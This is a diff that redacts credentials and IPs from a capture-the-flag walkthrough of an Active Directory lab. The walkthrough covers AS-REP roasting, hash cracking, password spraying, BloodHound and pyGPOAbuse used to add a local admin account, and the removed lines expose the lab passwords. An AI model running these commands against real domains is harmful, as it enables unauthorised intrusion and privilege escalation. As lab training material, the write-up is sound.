@@ -13,10 +13,10 @@ Sysco is a medium-rated Active Directory lab simulating an external penetration 
 **Attack Path:**
 ```
 Web enum (#team page) → username-anarchy + Kerbrute → ASREPRoast jack.dowland
-→ Hashcat (musicman1) → Roundcube webmail → router config email (Cisco IOS hash)
-→ Hashcat -m 500 (Chocolate1) → Password spray → lainey.moore:Chocolate1
+→ Hashcat (cracked) → Roundcube webmail → router config email (Cisco IOS hash)
+→ Hashcat -m 500 (cracked) → Password spray → lainey.moore
 → Evil-WinRM / RDP → User flag
-→ RDP enum (PuTTY .lnk) → greg.shields:5y5coSmarter2025!!!
+→ RDP enum (PuTTY .lnk) → greg.shields plaintext creds
 → BloodHound → greg.shields GenericAll on Default Domain Policy GPO
 → Get-GPO -All → pyGPOAbuse (Immediate Scheduled Task as SYSTEM)
 → Local admin → RDP → Root flag
@@ -28,7 +28,7 @@ Web enum (#team page) → username-anarchy + Kerbrute → ASREPRoast jack.dowlan
 
 | Host | IP | Role |
 |------|-----|------|
-| `DC01.SYSCO.LOCAL` | `10.1.172.251` | Windows Domain Controller |
+| `DC01.SYSCO.LOCAL` | `<DC_IP>` | Windows Domain Controller |
 
 ---
 
@@ -134,7 +134,7 @@ username-anarchy -i ./users.txt > wordlist.txt
 ### Kerbrute — Valid AD Account Discovery
 
 ```bash
-kerbrute userenum -d sysco.local --dc 10.1.172.251 wordlist.txt
+kerbrute userenum -d sysco.local --dc <DC_IP> wordlist.txt
 ```
 
 ```
@@ -166,19 +166,19 @@ hashcat hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ```
-$krb5asrep$23$jack.dowland@...:musicman1
+$krb5asrep$23$jack.dowland@...:REDACTED
 ```
 
-**Credentials: `jack.dowland:musicman1`**
+**Credentials: `jack.dowland:REDACTED`**
 
 ### Verify
 
 ```bash
-nxc smb sysco.local -u jack.dowland -p musicman1 --shares
+nxc smb sysco.local -u jack.dowland -p 'REDACTED' --shares
 ```
 
 ```
-SMB  DC01  [+] SYSCO.LOCAL\jack.dowland:musicman1
+SMB  DC01  [+] SYSCO.LOCAL\jack.dowland:REDACTED
 SMB  DC01  NETLOGON  READ
 SMB  DC01  SYSVOL    READ
 ```
@@ -190,7 +190,7 @@ SMB  DC01  SYSVOL    READ
 ### Dump Domain Users
 
 ```bash
-nxc ldap dc01.sysco.local -u jack.dowland -p musicman1 --users
+nxc ldap dc01.sysco.local -u jack.dowland -p 'REDACTED' --users
 ```
 
 ```
@@ -204,7 +204,7 @@ greg.shields    2025-10-18 00:51:59  263      System Administrator
 ### Password Policy
 
 ```bash
-nxc ldap dc01.sysco.local -u jack.dowland -p musicman1 -d sysco.local --pass-pol
+nxc ldap dc01.sysco.local -u jack.dowland -p 'REDACTED' -d sysco.local --pass-pol
 ```
 
 Key findings:
@@ -216,8 +216,8 @@ Key findings:
 ### BloodHound Collection
 
 ```bash
-nxc ldap dc01.sysco.local -u jack.dowland -p musicman1 \
-  --bloodhound -c All --dns-server 10.1.172.251
+nxc ldap dc01.sysco.local -u jack.dowland -p 'REDACTED' \
+  --bloodhound -c All --dns-server <DC_IP>
 ```
 
 ```
@@ -238,7 +238,7 @@ Members of this group can modify group policy for the domain. Compromising `greg
 
 ## Roundcube Webmail — `jack.dowland`
 
-Testing `jack.dowland:musicman1` against the Roundcube portal at `http://sysco.local/roundcube/` — login succeeds.
+Testing `jack.dowland:REDACTED` against the Roundcube portal at `http://sysco.local/roundcube/` — login succeeds.
 
 ![Roundcube login success](screenshots/roundcube-jack-login.png)
 
@@ -262,38 +262,38 @@ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ```
-$1$mERr$isugnYiHsjHT.i.tc2GDY.:Chocolate1
+$1$mERr$isugnYiHsjHT.i.tc2GDY.:REDACTED
 ```
 
-**Cracked: `Chocolate1`**
+**Cracked: `REDACTED`**
 
 ---
 
 ## Lateral Movement — Compromising `lainey.moore`
 
-Spray `Chocolate1` against the known domain users:
+Spray the cracked hash against the known domain users:
 
 ```bash
-nxc smb dc01.sysco.local -u users_short.txt -p Chocolate1 --continue-on-success
+nxc smb dc01.sysco.local -u users_short.txt -p 'REDACTED' --continue-on-success
 ```
 
 ```
-SMB  DC01  [-] SYSCO.LOCAL\greg.shields:Chocolate1 STATUS_LOGON_FAILURE
-SMB  DC01  [+] SYSCO.LOCAL\lainey.moore:Chocolate1
+SMB  DC01  [-] SYSCO.LOCAL\greg.shields:REDACTED STATUS_LOGON_FAILURE
+SMB  DC01  [+] SYSCO.LOCAL\lainey.moore:REDACTED
 ```
 
-**Credentials: `lainey.moore:Chocolate1`**
+**Credentials: `lainey.moore:REDACTED`**
 
 ### BloodHound — `lainey.moore` Permissions
 
 Lainey is a member of **Remote Management Users** and **Remote Desktop Users** — she has WinRM and RDP access.
 
 ```bash
-nxc winrm dc01.sysco.local -u lainey.moore -p Chocolate1
+nxc winrm dc01.sysco.local -u lainey.moore -p 'REDACTED'
 ```
 
 ```
-WINRM  DC01  [+] SYSCO.LOCAL\lainey.moore:Chocolate1 (Pwn3d!)
+WINRM  DC01  [+] SYSCO.LOCAL\lainey.moore:REDACTED (Pwn3d!)
 ```
 
 ### GUI Access via RDP — Remmina
@@ -302,7 +302,7 @@ WINRM  DC01  [+] SYSCO.LOCAL\lainey.moore:Chocolate1 (Pwn3d!)
 sudo apt install remmina remmina-plugin-rdp
 ```
 
-RDP in as `lainey.moore:Chocolate1`.
+RDP in as `lainey.moore:REDACTED`.
 
 ### User Flag
 
@@ -342,23 +342,19 @@ Reading the `.lnk` file with `type` in PowerShell reveals embedded plaintext cre
 
 ![PuTTY .lnk file — plaintext credentials](screenshots/putty-lnk-creds.png)
 
-```
-5y5coSmarter2025!!!
-```
-
 `sysadmin` = `greg.shields` (System Administrator per AD description).
 
 ### Verify
 
 ```bash
-nxc smb dc01.sysco.local -u greg.shields -p '5y5coSmarter2025!!!' --shares
+nxc smb dc01.sysco.local -u greg.shields -p 'REDACTED' --shares
 ```
 
 ```
-SMB  DC01  [+] SYSCO.LOCAL\greg.shields:5y5coSmarter2025!!!
+SMB  DC01  [+] SYSCO.LOCAL\greg.shields:REDACTED
 ```
 
-**Credentials: `greg.shields:5y5coSmarter2025!!!`**
+**Credentials: `greg.shields:REDACTED`**
 
 ---
 
@@ -401,8 +397,6 @@ Owner            : SYSCO\Domain Admins
 Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
 ```
 
-Cross-reference GUIDs against BloodHound to identify which GPO `greg.shields` has GenericAll over.
-
 Cross-reference GUIDs against BloodHound to identify which GPO `greg.shields` has GenericAll over:
 
 ![BloodHound — GPO ID cross-reference](screenshots/bloodhound-gpo-id.png)
@@ -412,14 +406,14 @@ Cross-reference GUIDs against BloodHound to identify which GPO `greg.shields` ha
 ### Step 1 — Create Local Admin + RDP User
 
 ```bash
-./pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' \
+./pygpoabuse.py sysco.local/greg.shields:'REDACTED' \
   -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' \
-  -dc-ip 10.1.172.251 \
+  -dc-ip <DC_IP> \
   -f \
-  -command 'net user jhaxx P@ss123! /add && net localgroup administrators jhaxx /add && net localgroup "Remote Desktop Users" jhaxx /add'
+  -command 'net user jhaxx REDACTED /add && net localgroup administrators jhaxx /add && net localgroup "Remote Desktop Users" jhaxx /add'
 ```
 
-Creates `jhaxx:P@ss123!`, adds to **Administrators** and **Remote Desktop Users**. The Immediate Scheduled Task fires without requiring `gpupdate /force`.
+Creates a local admin user, adds to **Administrators** and **Remote Desktop Users**. The Immediate Scheduled Task fires without requiring `gpupdate /force`.
 
 > Adding to **Remote Desktop Users** is required — local Administrators membership alone is not sufficient to log on via RDP if the account doesn't have the explicit "Allow log on through Remote Desktop Services" right.
 
@@ -427,18 +421,18 @@ Creates `jhaxx:P@ss123!`, adds to **Administrators** and **Remote Desktop Users*
 
 `xfreerdp` was not connecting — used **Remmina** instead.
 
-![RDP session as jhaxx — confirmed local admin](screenshots/rdp-jhaxx-admin.png)
+![RDP session — confirmed local admin](screenshots/rdp-jhaxx-admin.png)
 
 ### Step 3 — Cleanup
 
 ```bash
-./pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' \
+./pygpoabuse.py sysco.local/greg.shields:'REDACTED' \
   -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' \
-  -dc-ip 10.1.172.251 \
+  -dc-ip <DC_IP> \
   --cleanup
 ```
 
-Removes the Immediate-Task XML from the GPO and rolls back the GPO version. The `jhaxx` user and group memberships remain on the system — remove manually if needed.
+Removes the Immediate-Task XML from the GPO and rolls back the GPO version. The created user and group memberships remain on the system — remove manually if needed.
 
 ---
 
